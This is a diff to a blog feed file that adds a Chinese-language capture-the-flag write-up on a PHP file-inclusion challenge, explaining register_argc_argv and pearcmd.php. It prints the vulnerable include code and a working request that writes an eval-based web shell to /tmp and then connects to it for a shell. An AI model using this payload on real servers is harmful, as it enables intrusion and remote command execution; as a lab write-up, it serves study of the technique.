@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</title>
+    <link href="/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <url>/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    
+    <content type="html"><![CDATA[<h1 id="【NewStarCTF2023】-Include🍐-pearcmd-文件包含"><a href="#【NewStarCTF2023】-Include🍐-pearcmd-文件包含" class="headerlink" title="【NewStarCTF2023】 Include🍐 pearcmd 文件包含"></a>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>进入靶机, 看到代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注释提示我们去看 <code>phpinfo.php</code> , 路径输入, 可以看到 phpinfo(), 然后看到有一个 Flag 字段, 里面写着 <code>fake&#123;Check_register_argc_argv&#125;</code> 又是提示, 直接搜这个字段, 发现 <code>register_argc_argv = ON</code>, 再加上题目源码提示,那就很明显是 pear 文件包含漏洞了.</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h3><p>首先先来介绍一下 pear, pear的全称为<code>PHP Extension and Application Repository</code>，中文翻译为php扩展和应用仓库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复造轮子.</p><p>可以通过 pear 命令往 php 目录中下载内容(出网下载), 也可以使用 pear 命令创建内容(不出网).</p><h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p><code>register_argc_argv</code> 是 <code>php.ini</code> 里面的一个选项，默认为OFF，如果被设置成 ON, 那么就能获得以下权利:</p><ol><li>在命令行模式下, 通过 <code>$_SERVER[‘argv’]</code> 获得命令行参数</li><li>在 Web 模式下, 可以在 URL 里嵌入 <code>+</code> 号, 其中会将<code>+</code> 号链接的参数的个数存入 <code>argc</code>, 各个参数的值存入 <code>argv</code>.</li></ol><h3 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h3><p>在 <code>pearcmd.php</code> 中, 会有逻辑尝试 <code>argv</code> 变量, 再尝试 <code>_SERVER[&#39;argv&#39;]</code> , 其中<code>_SERVER[&#39;argv&#39;]</code> 是我们可以控制的变量, 最后会把 <code>_SERVER[&#39;argv&#39;]</code> 给 return 出来, 所以我们这里可以在文件包含中获取的我们在 GET 里传递的参数了.</p><p>这里使用 <code>config-create</code> 来在本地指定目录创建文件, 然后用 <code>+</code> 代替空格, 构造请求如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p><img src="/process.jpg"></p><p>连接蚁剑, 即可 getshell.</p><p><img src="/result.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>Web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件包含</tag>
+      
+      <tag>pear</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</title>
     <link href="/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/"/>
     <url>/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/</url>
